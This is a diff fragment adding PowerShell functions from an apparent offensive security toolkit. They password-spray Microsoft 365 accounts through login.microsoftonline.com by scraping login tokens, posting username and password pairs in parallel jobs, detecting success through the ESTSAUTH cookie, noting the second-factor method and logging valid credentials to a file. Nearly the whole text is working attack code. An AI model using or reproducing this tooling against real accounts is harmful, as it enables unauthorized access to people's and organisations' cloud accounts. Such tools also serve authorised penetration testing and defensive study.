+                      $PostData = "i13=0&login=$Email&loginfmt=$Email&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=$Password&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=$Ctx&hpgrequestid=&flowToken=$FlowToken&PPSX=&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=&i18=&i19=122868"
+                      # Ugly try catch since 302 is a terminating error in Invoke-WebRequest
+                      $Request = Invoke-WebRequest -Uri $uri -Headers $headers -Method POST -Body $PostData -MaximumRedirection 0
+                      $SetCookieString = $Request.Headers["Set-Cookie"]
+                      $CookieArray = $SetCookieString.Split(";").Trim()
+                      $Cookies = @{}
+                      ForEach ($Cookie in $CookieArray)
+                      {
+                          $KeyValue = $Cookie.Split("=", 2)
+                          $Cookies[$KeyValue[0]] = $KeyValue[1]
+                      }
+                      if ($Cookies.ContainsKey("ESTSAUTH"))
+                      {
+                          $MfaIndex = $Request.Content.IndexOf("authMethodId`":`"")
+                          if ($MfaIndex -gt -1)
+                          {
+                              $MfaIndex += 15
+                              $EndMfaIndex = $Request.Content.IndexOf("`"", $MfaIndex)
+                              $AuthMethod = $Request.Content.Substring($MfaIndex, $EndMfaIndex-$MfaIndex)
+                              Write-Output "[*] SUCCESS! User: $Email Password: $Password (2FA: $AuthMethod)"
+                          }
+                          else
+                          {
+                              Write-Output "[*] SUCCESS! User: $Email Password: $Password"
+                          }
+                      }
+                  }
+                  # Build the request
+              } -ArgumentList $UserList[$_], $Password, $Uri, $Headers, $Tokens | Out-Null
+          }
+          $Complete = Get-Date
+          $MaxWaitAtEnd = 10000
+          $SleepTimer = 200
+          $FullResults = @()
+          While($(Get-Job -State Running).Count -gt 0)
+          {
+              $RunningJobs = ""
+              ForEach($Job in $(Get-Job -State Running))
+              {
+                  $RunningJobs += ", $($Job.name)"
+              }
+              $RunningJobs = $RunningJobs.Substring(2)
+              Write-Progress -Activity "Spraying password $Password..." -Status "$($(Get-Job -State Running).Count) threads remaining" -PercentComplete ($(Get-Job -State Completed).Count / $(Get-Job).Count * 100)
+              if($(New-TimeSpan $Complete $(Get-Date)).TotalSeconds -ge $MaxWaitAtEnd)
+              {
+                  Write-Host -ForegroundColor "red" "Time expired. Killing remaining jobs..."
+                  Get-Job -State Running | Remove-Job -Force
+              }
+              else
+              {
+                  Start-Sleep -Milliseconds $SleepTimer
+                  ForEach($Job in Get-Job)
+                  {
+                      $JobOutput = Receive-Job $Job
+                      if ($JobOutput)
+                      {
+                          Write-Host -ForegroundColor "green" $JobOutput
+                          $FullResults += $JobOutput
+                      }
+                  }
+              }
+          }
+          Write-Verbose ("[*] A total of " + $FullResults.Count + " account(s) used password: $Password")
+          if ($OutFile -ne "")
+          {
+              Write-Verbose "Writing results to $OutFile"
+              $FullResults = $FullResults -Replace '\[\*\] SUCCESS! User: ', ''
+              $FullResults = $FullResults -Replace " Password: ", ":"
+              $FullResults | Out-File -Encoding ascii -Append $OutFile
+          }
+      }
+      if ($OutFile -ne "")
+      {
+          Write-Output "Results have been written to $OutFile"
+      }
+  }
+}
+
+function Read-MsftOfficeLoginTokens {
+  <#
+  .SYNOPSIS
+  Retrieve the necessary tokens to prime username enumeration
+  and password spraying.
+
+  .DESCRIPTION
+  This module retrieves the nonce, flowToken and ctx tokens from
+  the login.microsoftonline.com page. These items are necessary
+  for login attempts. A PSObject is returned of the form:
+
+  {
+      Referer: "$Uri";
+      Ctx: "$Ctx";
+      FlowToken: "$FlowToken";
+  }
+
+  Function: Read-MsftLoginTokens
+  Author: Dwight Hohnstein (@djhohnstein)
+  License: MIT
+  Required Dependencies: PowerShell 3.0 or above.
+  Optional Dependencies: None
+
+  .EXAMPLE
+  $tokens = Read-MsftLoginTokens
+
+  #>
+  $results = @{}
+  $request = [System.Net.WebRequest]::Create("https://login.microsoftonline.com")
+  $response = $request.GetResponse()
+  # Fetch the referer URI for the Nonce token
+  $Referer = $response.ResponseUri.AbsoluteUri
+  $results.Referer = $Referer
+  Write-Verbose "Using Referer URL: $Referer"
+  # Prime the page for reading
+  $stream = $response.GetResponseStream()
+  $streamReader = New-Object System.IO.StreamReader $stream
+  $htmlResp = $streamReader.ReadToEnd()
+  $sFTIndex = $htmlResp.IndexOf("sFT`":`"")
+  $sFTIndex += 6
+  $EndFTIndex = $htmlResp.IndexOf("`"", $sFTIndex)
+  $FlowToken = $htmlResp.Substring($sFTIndex, $EndFTIndex-$sFTIndex)
+  $results.FlowToken = $FlowToken
+  Write-Verbose "Using FlowToken: $FlowToken"
+  $sCtxIndex = $htmlResp.IndexOf("sCtx`":`"")
+  $sCtxIndex += 7
+  $EndCtxIndex = $htmlResp.IndexOf("`"", $sCtxIndex)
+  $Ctx = $htmlResp.Substring($sCtxIndex, $EndCtxIndex-$sCtxIndex)
+  $results.Ctx = $Ctx
+  Write-Verbose "Using ctx: $Ctx"
+  return $results
+} 
 function Invoke-UsernameHarvestEAS {
 <#
   .SYNOPSIS
